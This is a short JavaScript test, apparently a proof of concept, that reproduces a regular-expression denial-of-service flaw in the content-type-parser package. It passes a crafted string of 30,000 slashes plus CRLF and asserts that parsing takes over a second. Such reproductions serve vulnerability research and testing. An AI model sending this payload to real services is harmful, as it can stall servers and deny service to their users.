test("ReDoS in content-type-parser", () => {
  const measureTime = require("../utils").measureTime;
  const contentTypeParser = require("content-type-parser");
  let t = measureTime(function () {
    contentTypeParser("/".repeat(30000) + "\r\n");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
